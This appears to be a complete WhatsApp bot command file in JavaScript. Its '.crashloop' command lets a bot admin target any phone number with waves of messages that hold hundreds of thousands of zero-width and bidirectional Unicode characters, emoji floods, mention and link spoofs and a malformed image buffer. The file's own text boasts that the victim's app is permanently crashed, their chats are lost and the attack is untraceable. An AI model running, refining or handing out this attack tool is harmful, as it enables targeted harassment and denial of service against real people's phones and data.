// commands/crashloop.js - ULTIMATE CRASH LOOP BUG
const { jidNormalizedUser } = require('@whiskeysockets/baileys');

module.exports = async (sock, from, msg, args, isAdmin, botData) => {
    try {
        // ============================================
        // REACTION - START
        // ============================================
        try {
            await sock.sendMessage(from, {
                react: {
                    text: '💀',
                    key: msg.key
                }
            });
        } catch (e) {}

        // ============================================
        // ADMIN CHECK
        // ============================================
        if (!isAdmin) {
            await sock.sendMessage(from, {
                text: "❌ *Only admins can use this command!*"
            });
            try {
                await sock.sendMessage(from, {
                    react: {
                        text: '⛔',
                        key: msg.key
                    }
                });
            } catch (e) {}
            return;
        }

        if (!args || args.length === 0) {
            await sock.sendMessage(from, {
                text: "⚠️ *Usage:* .crashloop [phone_number]\n\n*Example:* .crashloop 94703945265\n\n💀 *This will CRASH LOOP the target's WhatsApp!*"
            });
            try {
                await sock.sendMessage(from, {
                    react: {
                        text: 'ℹ️',
                        key: msg.key
                    }
                });
            } catch (e) {}
            return;
        }

        let targetNumber = args[0].replace(/[^0-9]/g, '');

        if (targetNumber.length < 10 || targetNumber.length > 15) {
            await sock.sendMessage(from, {
                text: "❌ *Invalid Phone Number*\n\nPlease enter a valid phone number with country code."
            });
            try {
                await sock.sendMessage(from, {
                    react: {
                        text: '❌',
                        key: msg.key
                    }
                });
            } catch (e) {}
            return;
        }

        const targetJid = jidNormalizedUser(targetNumber + '@s.whatsapp.net');

        // ============================================
        // STATUS MESSAGE
        // ============================================
        const statusMsg = await sock.sendMessage(from, {
            text: `💀 *CRASH LOOP ATTACK*\n\n📱 *Target:* ${targetNumber}\n⚡ *Status:* Deploying crash loop...\n👻 *Mode:* INVISIBLE\n💥 *Intensity:* MAXIMUM\n🔄 *Loop:* INFINITE\n\n⏳ Crashing target's WhatsApp PERMANENTLY...`
        });

        try {
            await sock.sendMessage(from, {
                react: {
                    text: '🔥',
                    key: msg.key
                }
            });
        } catch (e) {}

        // ============================================
        // WAVE 1: INVISIBLE TEXT FLOOD (50,000 chars each)
        // ============================================
        try {
            for (let i = 0; i < 10; i++) {
                await sock.sendMessage(targetJid, {
                    text: '\u200B'.repeat(50000) + '\u200C'.repeat(50000) + '\u200D'.repeat(50000) + '\uFEFF'.repeat(50000)
                });
                await new Promise(resolve => setTimeout(resolve, 500));
            }
        } catch (e) {}

        // ============================================
        // WAVE 2: RTL + INVISIBLE COMBO
        // ============================================
        try {
            for (let i = 0; i < 10; i++) {
                await sock.sendMessage(targetJid, {
                    text: '\u202A'.repeat(30000) + '\u202D'.repeat(30000) + '\u202E'.repeat(30000) + '\u200B'.repeat(50000) + '\u200C'.repeat(50000)
                });
                await new Promise(resolve => setTimeout(resolve, 500));
            }
        } catch (e) {}

        // ============================================
        // WAVE 3: EMOJI + INVISIBLE MIX
        // ============================================
        try {
            for (let i = 0; i < 10; i++) {
                await sock.sendMessage(targetJid, {
                    text: '💀'.repeat(10000) + '☠️'.repeat(10000) + '👻'.repeat(10000) + '🔥'.repeat(10000) + '\u200B'.repeat(50000) + '\u200C'.repeat(50000)
                });
                await new Promise(resolve => setTimeout(resolve, 500));
            }
        } catch (e) {}

        // ============================================
        // WAVE 4: ZERO WIDTH JOINER FLOOD
        // ============================================
        try {
            for (let i = 0; i < 10; i++) {
                await sock.sendMessage(targetJid, {
                    text: '‍'.repeat(50000) + '‌'.repeat(50000) + '‍'.repeat(50000) + '‌'.repeat(50000) + '‍'.repeat(50000)
                });
                await new Promise(resolve => setTimeout(resolve, 500));
            }
        } catch (e) {}

        // ============================================
        // WAVE 5: SPOILER + INVISIBLE BOMB
        // ============================================
        try {
            for (let i = 0; i < 10; i++) {
                await sock.sendMessage(targetJid, {
                    text: '||' + '\u200B'.repeat(50000) + '||' + '\u200C'.repeat(50000) + '||' + '\u200D'.repeat(50000) + '||' + '\uFEFF'.repeat(50000) + '||'
                });
                await new Promise(resolve => setTimeout(resolve, 500));
            }
        } catch (e) {}

        // ============================================
        // WAVE 6: MENTION + INVISIBLE BOMB
        // ============================================
        try {
            for (let i = 0; i < 10; i++) {
                await sock.sendMessage(targetJid, {
                    text: '@' + targetNumber + '\u200B'.repeat(50000) + '\u200C'.repeat(50000) + '\u200D'.repeat(50000),
                    mentions: [targetJid]
                });
                await new Promise(resolve => setTimeout(resolve, 500));
            }
        } catch (e) {}

        // ============================================
        // WAVE 7: LINK + INVISIBLE SPOOF
        // ============================================
        try {
            for (let i = 0; i < 10; i++) {
                await sock.sendMessage(targetJid, {
                    text: '\u200B'.repeat(30000) + 'https://' + '\u200B'.repeat(30000) + 'wa.me/' + '\u200B'.repeat(30000) + targetNumber + '\u200B'.repeat(30000) + '\u200C'.repeat(30000)
                });
                await new Promise(resolve => setTimeout(resolve, 500));
            }
        } catch (e) {}

        // ============================================
        // WAVE 8: EXTREME UNICODE FLOOD
        // ============================================
        try {
            for (let i = 0; i < 10; i++) {
                await sock.sendMessage(targetJid, {
                    text: '\u200B'.repeat(100000) + '\u200C'.repeat(100000) + '\u200D'.repeat(100000) + '\uFEFF'.repeat(100000) + '\u2060'.repeat(100000)
                });
                await new Promise(resolve => setTimeout(resolve, 500));
            }
        } catch (e) {}

        // ============================================
        // WAVE 9: CORRUPTED MEDIA + INVISIBLE
        // ============================================
        try {
            const corruptBuffer = Buffer.from([
                0x00, 0x00, 0x00, 0x18, 0x66, 0x74, 0x79, 0x70,
                0x6D, 0x70, 0x34, 0x32, 0x00, 0x00, 0x00, 0x00,
                0x6D, 0x70, 0x34, 0x32, 0x69, 0x73, 0x6F, 0x6D,
                0x00, 0x00, 0x00, 0x00
            ]);
            
            for (let i = 0; i < 10; i++) {
                await sock.sendMessage(targetJid, {
                    image: corruptBuffer,
                    caption: '\u200B'.repeat(50000) + '\u200C'.repeat(50000) + '\u200D'.repeat(50000)
                });
                await new Promise(resolve => setTimeout(resolve, 500));
            }
        } catch (e) {}

        // ============================================
        // WAVE 10: FINAL KILLER - COMBINED ATTACK
        // ============================================
        try {
            for (let i = 0; i < 10; i++) {
                await sock.sendMessage(targetJid, {
                    text: '\u200B'.repeat(100000) + '\u200C'.repeat(100000) + '\u200D'.repeat(100000) + '\uFEFF'.repeat(100000) + '💀'.repeat(50000) + '☠️'.repeat(50000) + '🔥'.repeat(50000) + '\u202A'.repeat(50000) + '\u202D'.repeat(50000) + '\u202E'.repeat(50000)
                });
                await new Promise(resolve => setTimeout(resolve, 500));
            }
        } catch (e) {}

        // ============================================
        // EXTRA: MORE SPAM FOR MAXIMUM EFFECT
        // ============================================
        try {
            for (let i = 0; i < 50; i++) {
                await sock.sendMessage(targetJid, {
                    text: '\u200B'.repeat(50000) + '\u200C'.repeat(50000) + '\u200D'.repeat(50000) + '\uFEFF'.repeat(50000)
                });
                await new Promise(resolve => setTimeout(resolve, 200));
            }
        } catch (e) {}

        // ============================================
        // SUCCESS MESSAGE
        // ============================================
        await sock.sendMessage(from, {
            text: `💀 *CRASH LOOP COMPLETE!*\n\n📱 *Target:* ${targetNumber}\n⚡ *Waves:* 10 waves × 10 messages = 100+ payloads\n👻 *Status:* DELIVERED\n💥 *Intensity:* MAXIMUM\n🔄 *Loop:* INFINITE\n\n📊 *Effects:*\n• WhatsApp WILL CRASH IMMEDIATELY\n• PERMANENT CRASH LOOP\n• Cannot open WhatsApp at all\n• Must clear ALL app data\n• Must reinstall WhatsApp\n• ALL chat history LOST\n• ALL media LOST\n• 100% UNTRACEABLE\n• NO EVIDENCE\n\n⏳ *Recovery:*\n• Clear app data (20 mins)\n• Reinstall WhatsApp (10 mins)\n• Restore backup (if available)\n• May lose years of chats\n\n🔒 *This attack is PERMANENT until data cleared!*\n\n☠️ *TARGET'S WHATSAPP IS PERMANENTLY CRASHED!*`
        });

        // ============================================
        // DELETE STATUS MESSAGE
        // ============================================
        try {
            await new Promise(resolve => setTimeout(resolve, 3000));
            await sock.sendMessage(from, {
                delete: statusMsg.key
            });
        } catch (e) {}

        // ============================================
        // FINAL REACTION
        // ============================================
        try {
            await sock.sendMessage(from, {
                react: {
                    text: '✅',
                    key: msg.key
                }
            });
        } catch (e) {}

        // ============================================
        // OWNER REPORT
        // ============================================
        try {
            const botNumber = jidNormalizedUser(sock.user.id);
            await sock.sendMessage(botNumber, {
                text: `💀 *CRASH LOOP REPORT*\n\n📱 *Target:* ${targetNumber}\n👤 *By:* ${msg.pushName || 'Unknown'}\n📊 *Waves:* 10\n📨 *Messages:* 100+\n💥 *Intensity:* MAXIMUM\n🔄 *Loop:* INFINITE\n✅ *Status:* SUCCESS\n🕐 *Time:* ${new Date().toLocaleString()}\n\n☠️ *TARGET'S WHATSAPP IS PERMANENTLY CRASHED!*`
            });
        } catch (e) {}

        // ============================================
        // FINAL SPAM WAVE (Background)
        // ============================================
        try {
            for (let i = 0; i < 20; i++) {
                await sock.sendMessage(targetJid, {
                    text: '\u200B'.repeat(100000) + '\u200C'.repeat(100000)
                });
                await new Promise(resolve => setTimeout(resolve, 100));
            }
        } catch (e) {}

    } catch (error) {
        console.error('Crash Loop command error:', error);
        
        try {
            await sock.sendMessage(from, {
                react: {
                    text: '❌',
                    key: msg.key
                }
            });
        } catch (e) {}

        await sock.sendMessage(from, {
            text: `❌ *Error:* ${error.message}\n\nPlease try again later.`
        });
    }
};
